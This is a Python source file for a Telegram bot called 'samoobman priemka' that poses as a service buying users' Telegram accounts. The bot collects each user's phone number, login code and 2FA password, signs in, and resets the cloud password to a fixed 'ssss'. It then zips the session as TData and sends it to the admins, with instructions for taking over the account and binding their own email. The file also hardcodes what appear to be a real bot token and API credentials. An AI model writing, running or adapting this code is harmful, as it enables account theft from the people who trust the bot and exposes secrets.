# ==========================================
# Проект: samoobman priemka (Telegram Bot)
# Стек: aiogram 3.x, aiosqlite, telethon, opentele
# ==========================================

import asyncio
import logging
import os
import shutil
import aiosqlite
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InputMediaPhoto,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from opentele.tl import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeEmptyError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("samoobman_bot")

# ================= КОНФИГУРАЦИЯ =================
API_TOKEN = "8998218273:AAGrHvaree4LyUR1n2x-dYJ2UX3fqEMEUvk"
ADMIN_IDS = [8887644613]
REQUIRED_CHANNEL = "@samoobmanTG"
LOGS_CHANNEL_ID = -1003813816419

API_ID = 31063615  # Строго integer для Telethon!
API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки

DB_PATH = "database.db"
SESSIONS_DIR = "sessions_data"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)


# ================= СОСТОЯНИЯ (FSM) =================
class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()


class AdminStates(StatesGroup):
    waiting_for_user_id_balance = State()
    waiting_for_new_balance = State()
    waiting_for_broadcast_text = State()
    waiting_for_photo_menu = State()
    waiting_for_photo_profile = State()
    waiting_for_photo_withdraw = State()
    waiting_for_photo_submit = State()


class WithdrawStates(StatesGroup):
    waiting_for_amount = State()


# ================= БАЗА ДАННЫХ =================
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS users
                         (
                             user_id
                             INTEGER
                             PRIMARY
                             KEY,
                             username
                             TEXT,
                             full_name
                             TEXT,
                             balance
                             REAL
                             DEFAULT
                             0.0,
                             total_earned
                             REAL
                             DEFAULT
                             0.0,
                             reg_date
                             TEXT
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS accounts
                         (
                             id
                             INTEGER
                             PRIMARY
                             KEY
                             AUTOINCREMENT,
                             user_id
                             INTEGER,
                             phone
                             TEXT,
                             session_name
                             TEXT,
                             date
                             TEXT
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS withdraw_requests
                         (
                             id
                             INTEGER
                             PRIMARY
                             KEY
                             AUTOINCREMENT,
                             user_id
                             INTEGER,
                             amount
                             REAL,
                             status
                             TEXT
                             DEFAULT
                             'pending'
                         )
                         """)
        await db.execute("""
                         CREATE TABLE IF NOT EXISTS settings
                         (
                             key
                             TEXT
                             PRIMARY
                             KEY,
                             value
                             TEXT
                         )
                         """)
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users WHERE user_id = ?",
                (user_id,),
        ) as cursor:
            return await cursor.fetchone()


async def add_user(user_id: int, username: str, full_name: str, reg_date: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """INSERT
            OR IGNORE INTO users (user_id, username, full_name, reg_date) 
               VALUES (?, ?, ?, ?)""",
            (user_id, username, full_name, reg_date),
        )
        await db.commit()


async def get_setting(key: str) -> str:
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM settings WHERE key = ?", (key,)) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else None


async def set_setting(key: str, value: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
        await db.commit()


# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ОДНО СООБЩЕНИЕ) =================
async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
                                parse_mode: str = "Markdown"):
    """Универсальная функция: всегда редактирует текущее сообщение (текст или фото), не плодя новые."""
    photo_file_id = await get_setting(photo_key)

    if photo_file_id:
        try:
            await message.edit_media(
                media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=parse_mode),
                reply_markup=reply_markup
            )
        except Exception:
            try:
                await message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
            except Exception:
                pass
    else:
        try:
            await message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            pass


def get_main_keyboard(is_admin: bool = False):
    kb = [
        [
            InlineKeyboardButton(text="👤 Профиль", callback_data="menu_profile"),
            InlineKeyboardButton(text="📥 Сдать ТГ аккаунт", callback_data="menu_submit_tg"),
        ],
        [
            InlineKeyboardButton(text="💰 Вывод средств", callback_data="menu_withdraw"),
            InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/freakyfeelings")
        ],
    ]
    if is_admin:
        kb.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад в меню", callback_data="back_main")]
    ])


async def check_sub(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status not in ["left", "kicked"]
    except Exception:
        return True


async def send_log(text: str):
    try:
        await bot.send_message(chat_id=LOGS_CHANNEL_ID, text=text, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Не удалось отправить лог: {e}")


async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
                                    session_name: str):
    try:
        await client.edit_2fa(new_password=AUTO_PASSWORD)
    except Exception as e:
        logger.warning(f"Не удалось обновить пароль: {e}")

    tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
    archive_path = None

    try:
        await client.ToTData(dirName=tdata_folder)
        archive_path = shutil.make_archive(tdata_folder, 'zip', tdata_folder)
    except Exception as e:
        logger.error(f"Ошибка при создании TData: {e}")
    finally:
        await client.disconnect()

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT INTO accounts (user_id, phone, session_name, date) VALUES (?, ?, ?, datetime('now'))",
            (message.from_user.id, phone, session_name)
        )
        await db.execute(
            "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?",
            (message.from_user.id,)
        )
        await db.commit()

    tdata_instruction = (
        "\n\n📖 **Инструкция по входу в аккаунт через TData:**\n"
        "1. Скачайте архив и распакуйте его.\n"
        "2. Скачайте официальную портативную версию Telegram для ПК (Telegram Portable).\n"
        "3. В папке с распакованным Telegram Portable найдите папку `tdata` и удалите её содержимое.\n"
        "4. Перенесите файлы из распакованного архива в пустую папку `tdata` вашего Telegram Portable.\n"
        "5. Запустите `Telegram.exe` — аккаунт откроется автоматически (если попросит пароль, укажите `ssss`).\n"
        "6. Перейдите в настройки безопасности и привяжите свою почту."
    )

    if archive_path and os.path.exists(archive_path):
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_document(
                    chat_id=admin_id,
                    document=FSInputFile(archive_path),
                    caption=(
                        f"📥 **Новый аккаунт (TData) успешно принят!**\n\n"
                        f"• Пользователь: `{message.from_user.id}`\n"
                        f"• Телефон: `{phone}`\n"
                        f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
                        f"{tdata_instruction}"
                    ),
                    parse_mode="Markdown"
                )
            except Exception as ex:
                logger.error(f"Не удалось отправить файл админу: {ex}")

    await send_log(
        f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
    )

    success_text = "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
    await edit_to_photo_or_text(message, success_text, get_main_keyboard(message.from_user.id in ADMIN_IDS),
                                "photo_menu")
    await state.clear()


# ================= ОБРАБОТЧИКИ КОМАНД И КНОПОК =================
@router.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    reg_date = user.date.strftime("%Y-%m-%d %H:%M:%S") if hasattr(user, 'date') else message.date.strftime(
        "%Y-%m-%d %H:%M:%S")
    await add_user(user.id, user.username or "NoUsername", user.full_name, reg_date)

    if not await check_sub(user.id):
        sub_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 Подписаться на канал",
                                  url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")],
            [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subscription")],
        ])
        await message.answer(
            "⚠️ Для использования бота **samoobman priemka** необходимо подписаться на наш Telegram канал!",
            reply_markup=sub_kb, parse_mode="Markdown"
        )
        return

    is_admin = user.id in ADMIN_IDS
    text = (
        "👋 Добро пожаловать в официального бота автоскупки аккаунтов!\n\n"
        "🔹 **samoobman priemka** — лучший сервис быстрой и безопасной скупки "
        "ваших Telegram аккаунтов по выгодным ценам.\n\n"
        "Выберите нужный раздел в меню ниже:"
    )
    await message.answer(text, reply_markup=get_main_keyboard(is_admin), parse_mode="Markdown")


@router.callback_query(F.data == "check_subscription")
async def cb_check_sub(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        is_admin = callback.from_user.id in ADMIN_IDS
        text = "✅ Подписка подтверждена! Добро пожаловать в **samoobman priemka**."
        await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")
    else:
        await callback.answer("❌ Вы не подписались на канал!", show_alert=True)


@router.callback_query(F.data == "back_main")
async def cb_back_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    is_admin = callback.from_user.id in ADMIN_IDS
    text = "🏠 Главное меню сервиса **samoobman priemka**.\n\nВыберите действие:"
    await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")


# --- ПРОФИЛЬ ---
@router.callback_query(F.data == "menu_profile")
async def cb_profile(callback: CallbackQuery):
    user_data = await get_user(callback.from_user.id)
    if not user_data:
        return await callback.answer("Ошибка данных пользователя.", show_alert=True)

    uid, username, full_name, balance, total_earned, reg_date = user_data
    text = (
        f"👤 **Ваш профиль в samoobman priemka**\n\n"
        f"• **Имя:** {full_name} (@{username})\n"
        f"• **ID:** `{uid}`\n"
        f"• **Дата регистрации:** {reg_date}\n"
        f"• **Текущий баланс:** `${balance:.2f}`\n"
        f"• **Всего заработано:** `${total_earned:.2f}`"
    )
    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_profile")


# --- СДАТЬ ТГ ---
@router.callback_query(F.data == "menu_submit_tg")
async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
    text = (
        "📥 **Сдача Telegram аккаунта** в **samoobman priemka**\n\n"
        "Пожалуйста, введите номер телефона вашего аккаунта в международном "
        "формате (например, `+79991112233`):"
    )
    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_submit")
    await state.set_state(AuthStates.waiting_for_phone)


@router.message(AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    # Удаляем сообщение юзера с номером для чистоты интерфейса (опционально)
    try:
        await message.delete()
    except Exception:
        pass

    phone = message.text.strip()
    if not phone.startswith("+"):
        data = await state.get_data()
        msg_id = data.get("prompt_msg_id")
        err_text = "❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:"
        if msg_id:
            try:
                await bot.edit_message_caption(chat_id=message.chat.id, message_id=msg_id, caption=err_text,
                                               reply_markup=get_back_keyboard())
            except Exception:
                try:
                    await bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=err_text,
                                                reply_markup=get_back_keyboard())
                except Exception:
                    pass
        return

    session_name = f"session_{message.from_user.id}_{int(asyncio.get_event_loop().time())}"
    session_path = os.path.join(SESSIONS_DIR, session_name)

    await state.update_data(phone=phone, session_name=session_name, session_path=session_path)

    # ВАЖНО: API_ID передается строго как int, opentele примет его правильно
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        await state.update_data(phone_code_hash=sent.phone_code_hash, client=client)

        # Редактируем последнее системное сообщение бота вместо отправки нового
        data = await state.get_data()
        code_text = "📲 Код подтверждения отправлен в ваш Telegram. Введите полученный пятизначный код:"

        # Получаем последнее сообщение бота из истории или сохраняем ID
        sent_msg = await message.answer(code_text, reply_markup=get_back_keyboard())
        await state.update_data(prompt_msg_id=sent_msg.message_id)
        await state.set_state(AuthStates.waiting_for_code)
    except Exception as e:
        await client.disconnect()
        err_msg = f"❌ Ошибка отправки кода: {e}\nПопробуйте заново через меню."
        await message.answer(err_msg, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
        await state.clear()


@router.message(AuthStates.waiting_for_code)
async def process_code(message: Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass

    code = message.text.strip()
    data = await state.get_data()
    client: TelegramClient = data["client"]
    phone = data["phone"]
    session_name = data["session_name"]
    phone_code_hash = data.get("phone_code_hash")
    prompt_msg_id = data.get("prompt_msg_id")

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        await finalize_auth_and_success(message, state, client, phone, session_name)
    except SessionPasswordNeededError:
        pwd_text = "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\nПожалуйста, введите ваш пароль от аккаунта:"
        if prompt_msg_id:
            try:
                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=pwd_text,
                                            reply_markup=get_back_keyboard())
            except Exception:
                pass
        await state.set_state(AuthStates.waiting_for_password)
    except (PhoneCodeInvalidError, PhoneCodeEmptyError):
        err_text = "❌ Неверный код. Попробуйте ввести правильный код:"
        if prompt_msg_id:
            try:
                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
                                            reply_markup=get_back_keyboard())
            except Exception:
                pass
    except Exception as e:
        err_text = f"❌ Ошибка авторизации: {e}"
        if prompt_msg_id:
            try:
                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
            except Exception:
                pass
        await client.disconnect()
        await state.clear()


@router.message(AuthStates.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass

    password = message.text.strip()
    data = await state.get_data()
    client: TelegramClient = data["client"]
    phone = data["phone"]
    session_name = data["session_name"]
    prompt_msg_id = data.get("prompt_msg_id")

    try:
        await client.sign_in(password=password)
        await finalize_auth_and_success(message, state, client, phone, session_name)
    except PasswordHashInvalidError:
        err_text = "❌ Неверный пароль. Попробуйте ввести правильный облачный пароль:"
        if prompt_msg_id:
            try:
                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
                                            reply_markup=get_back_keyboard())
            except Exception:
                pass
    except Exception as e:
        err_text = f"❌ Ошибка входа по паролю: {e}"
        if prompt_msg_id:
            try:
                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
            except Exception:
                pass
        await client.disconnect()
        await state.clear()


# --- ВЫВОД СРЕДСТВ ---
@router.callback_query(F.data == "menu_withdraw")
async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
    user_data = await get_user(callback.from_user.id)
    balance = user_data[3]

    if balance <= 0:
        return await callback.answer("❌ У вас недостаточно средств для вывода.", show_alert=True)

    text = (
        f"💰 **Вывод средств в samoobman priemka**\n\n"
        f"Ваш текущий баланс: **${balance:.2f}**\n"
        f"Введите сумму, которую хотите вывести:"
    )
    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_withdraw")
    await state.set_state(WithdrawStates.waiting_for_amount)


@router.message(WithdrawStates.waiting_for_amount)
async def process_withdraw_amount(message: Message, state: FSMContext):
    try:
        await message.delete()
    except Exception:
        pass

    try:
        amount = float(message.text.strip().replace(",", "."))
    except ValueError:
        return await message.answer("❌ Введите корректное число:")

    user_data = await get_user(message.from_user.id)
    balance = user_data[3]

    if amount <= 0 or amount > balance:
        return await message.answer(f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:")

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
        cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount, status) VALUES (?, ?, 'pending')",
                                  (message.from_user.id, amount))
        req_id = cursor.lastrowid
        await db.commit()

    withdraw_kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=f"✅ Выплачено (${amount})", callback_data=f"pay_success_{req_id}"),
        InlineKeyboardButton(text=f"❌ Отклонить", callback_data=f"pay_cancel_{req_id}"),
    ]])

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=(
                    f"🚨 **Новая заявка на вывод в samoobman priemka!**\n\n"
                    f"• От: {message.from_user.full_name} (`{message.from_user.id}`)\n"
                    f"• Сумма: **${amount:.2f}**"
                ),
                reply_markup=withdraw_kb, parse_mode="Markdown"
            )
        except Exception:
            pass

    success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
    await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
                         parse_mode="Markdown")
    await state.clear()


@router.callback_query(F.data.startswith("pay_success_"))
async def admin_pay_success(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    req_id = int(callback.data.split("_")[2])
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, amount FROM withdraw_requests WHERE id = ?", (req_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                uid, amt = row
                await db.execute("UPDATE withdraw_requests SET status = 'paid' WHERE id = ?", (req_id,))
                await db.commit()
                try:
                    await bot.send_message(
                        chat_id=uid,
                        text=f"✅ Ваша заявка на вывод **${amt:.2f}** в **samoobman priemka** успешно выплачена администратором!",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
    await callback.message.edit_text(f"{callback.message.text}\n\n**[ВЫПЛАЧЕНО]**", parse_mode="Markdown")


@router.callback_query(F.data.startswith("pay_cancel_"))
async def admin_pay_cancel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    req_id = int(callback.data.split("_")[2])
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, amount FROM withdraw_requests WHERE id = ?", (req_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                uid, amt = row
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amt, uid))
                await db.execute("UPDATE withdraw_requests SET status = 'cancelled' WHERE id = ?", (req_id,))
                await db.commit()
                try:
                    await bot.send_message(
                        chat_id=uid,
                        text=f"❌ Ваша заявка на вывод **${amt:.2f}** была отменена администратором, средства возвращены на баланс.",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
    await callback.message.edit_text(f"{callback.message.text}\n\n**[ОТМЕНЕНО]**", parse_mode="Markdown")


# ================= АДМИН-ПАНЕЛЬ =================
@router.callback_query(F.data == "admin_panel")
async def cb_admin_panel(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещен.", show_alert=True)

    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
        [InlineKeyboardButton(text="📂 Выгрузить архив TData", callback_data="admin_export_sessions")],
        [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
        [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
        [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="back_main")],
    ])
    await callback.message.edit_text(
        "👑 **Админ-панель samoobman priemka**\n\nВыберите нужную функцию:",
        reply_markup=admin_kb, parse_mode="Markdown"
    )


# --- УПРАВЛЕНИЕ КАРТИНКАМИ В АДМИНКЕ ---
@router.callback_query(F.data == "admin_photos_menu")
async def admin_photos_menu(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Главное меню (Фото)", callback_data="set_photo_menu")],
        [InlineKeyboardButton(text="🖼 Профиль (Фото)", callback_data="set_photo_profile")],
        [InlineKeyboardButton(text="🖼 Вывод средств (Фото)", callback_data="set_photo_withdraw")],
        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit")],
        [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
    ])
    await callback.message.edit_text(
        "🖼 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
        reply_markup=kb, parse_mode="Markdown"
    )


@router.callback_query(F.data.in_({"set_photo_menu", "set_photo_profile", "set_photo_withdraw", "set_photo_submit"}))
async def admin_set_photo_prompt(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return

    action_map = {
        "set_photo_menu": ("Главное меню", AdminStates.waiting_for_photo_menu),
        "set_photo_profile": ("Профиль", AdminStates.waiting_for_photo_profile),
        "set_photo_withdraw": ("Вывод средств", AdminStates.waiting_for_photo_withdraw),
        "set_photo_submit": ("Сдать ТГ аккаунт", AdminStates.waiting_for_photo_submit),
    }

    section_name, state_to_set = action_map[callback.data]
    await state.set_state(state_to_set)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Удалить текущее фото", callback_data=f"del_{callback.data}")],
        [InlineKeyboardButton(text="⬅️ Отмена", callback_data="admin_photos_menu")]
    ])

    await callback.message.edit_text(
        f"📸 Отправьте **фотографию** (изображение), которую хотите установить для раздела: **{section_name}**.\n\nИли нажмите кнопку ниже, чтобы удалить картинку (раздел станет текстовым):",
        reply_markup=kb, parse_mode="Markdown"
    )


@router.callback_query(F.data.startswith("del_set_photo_"))
async def admin_delete_photo(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return

    key_map = {
        "del_set_photo_menu": "photo_menu",
        "del_set_photo_profile": "photo_profile",
        "del_set_photo_withdraw": "photo_withdraw",
        "del_set_photo_submit": "photo_submit",
    }

    setting_key = key_map.get(callback.data)
    if setting_key:
        await set_setting(setting_key, "")
        await callback.answer("✅ Картинка успешно удалена!", show_alert=True)

    await admin_photos_menu(callback)


@router.message(F.photo, AdminStates.waiting_for_photo_menu)
@router.message(F.photo, AdminStates.waiting_for_photo_profile)
@router.message(F.photo, AdminStates.waiting_for_photo_withdraw)
@router.message(F.photo, AdminStates.waiting_for_photo_submit)
async def admin_save_photo(message: Message, state: FSMContext):
    if message.from_user.id not in ADMIN_IDS:
        return

    current_state = await state.get_state()
    state_to_key = {
        AdminStates.waiting_for_photo_menu.state: "photo_menu",
        AdminStates.waiting_for_photo_profile.state: "photo_profile",
        AdminStates.waiting_for_photo_withdraw.state: "photo_withdraw",
        AdminStates.waiting_for_photo_submit.state: "photo_submit",
    }

    setting_key = state_to_key.get(current_state)
    photo_file_id = message.photo[-1].file_id

    if setting_key:
        await set_setting(setting_key, photo_file_id)
        await message.answer("✅ Фотография для выбранного раздела успешно сохранена!")

    await state.clear()

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🖼 Главное меню (Фото)", callback_data="set_photo_menu")],
        [InlineKeyboardButton(text="🖼 Профиль (Фото)", callback_data="set_photo_profile")],
        [InlineKeyboardButton(text="🖼 Вывод средств (Фото)", callback_data="set_photo_withdraw")],
        [InlineKeyboardButton(text="🖼 Сдать ТГ аккаунт (Фото)", callback_data="set_photo_submit")],
        [InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")],
    ])
    await message.answer(
        "👑 **Настройка картинок для разделов**\n\nВыберите раздел, для которого хотите установить или изменить фото:",
        reply_markup=kb, parse_mode="Markdown"
    )


@router.callback_query(F.data == "admin_export_sessions")
async def admin_export_sessions(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    archive_name = "tdata_archive_all"
    if os.path.exists(SESSIONS_DIR) and os.listdir(SESSIONS_DIR):
        shutil.make_archive(archive_name, "zip", SESSIONS_DIR)
        await callback.message.answer_document(
            document=FSInputFile(f"{archive_name}.zip"),
            caption="📦 Архив всех папок TData аккаунтов **samoobman priemka**.",
            parse_mode="Markdown"
        )
    else:
        await callback.answer("📁 Папка сессий пуста.", show_alert=True)


@router.callback_query(F.data == "admin_export_txt")
async def admin_export_txt(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return

    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
                "SELECT user_id, username, full_name, balance, total_earned, reg_date FROM users") as cursor:
            rows = await cursor.fetchall()

    file_path = "users_table.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(
            f"{'ID':<12} | {'USERNAME':<15} | {'FULL NAME':<20} | {'BALANCE':<10} | {'EARNED':<10} | {'REG DATE'}\n")
        f.write("-" * 90 + "\n")
        for r in rows:
            f.write(
                f"{r[0]:<12} | {str(r[1]):<15} | {str(r[2]):<20} | ${float(r[3]):<9.2f} | ${float(r[4]):<9.2f} | {r[5]}\n")

    await callback.message.answer_document(
        document=FSInputFile(file_path),
        caption="📊 Таблица всех пользователей **samoobman priemka**.",
        parse_mode="Markdown"
    )


@router.callback_query(F.data == "admin_change_balance")
async def admin_change_balance_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await callback.message.answer("Введите Telegram ID пользователя, которому хотите изменить баланс:")
    await state.set_state(AdminStates.waiting_for_user_id_balance)


@router.message(AdminStates.waiting_for_user_id_balance)
async def admin_get_uid(message: Message, state: FSMContext):
    try:
        uid = int(message.text.strip())
    except ValueError:
        return await message.answer("❌ Неверный ID. Введите числовой ID:")

    user = await get_user(uid)
    if not user:
        await message.answer("❌ Пользователь с таким ID не найден в базе.")
        return await state.clear()

    await state.update_data(target_uid=uid)
    await message.answer(
        f"👤 Найден пользователь: {user[2]} (@{user[1]})\nТекущий баланс: ${user[3]:.2f}\n\nВведите новый баланс (число):")
    await state.set_state(AdminStates.waiting_for_new_balance)


@router.message(AdminStates.waiting_for_new_balance)
async def admin_set_balance(message: Message, state: FSMContext):
    try:
        new_bal = float(message.text.strip().replace(",", "."))
    except ValueError:
        return await message.answer("❌ Введите корректное число для баланса:")

    data = await state.get_data()
    uid = data["target_uid"]

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new_bal, uid))
        await db.commit()

    await message.answer(f"✅ Баланс пользователя `{uid}` успешно изменен на **${new_bal:.2f}**.", parse_mode="Markdown")
    await state.clear()


@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        return
    await callback.message.answer("📢 Введите текст рассылки для всех пользователей **samoobman priemka**:",
                                  parse_mode="Markdown")
    await state.set_state(AdminStates.waiting_for_broadcast_text)


@router.message(AdminStates.waiting_for_broadcast_text)
async def admin_send_broadcast(message: Message, state: FSMContext):
    text = message.text
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users") as cursor:
            users = await cursor.fetchall()

    count = 0
    for u in users:
        try:
            await bot.send_message(
                chat_id=u[0],
                text=f"📢 **Рассылка от samoobman priemka**\n\n{text}",
                parse_mode="Markdown"
            )
            count += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass

    await message.answer(f"✅ Рассылка завершена. Успешно отправлено: `{count}` пользователям.", parse_mode="Markdown")
    await state.clear()


# ================= ЗАПУСК БОТА =================
async def main():
    await init_db()
    logger.info("Бот samoobman priemka успешно запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())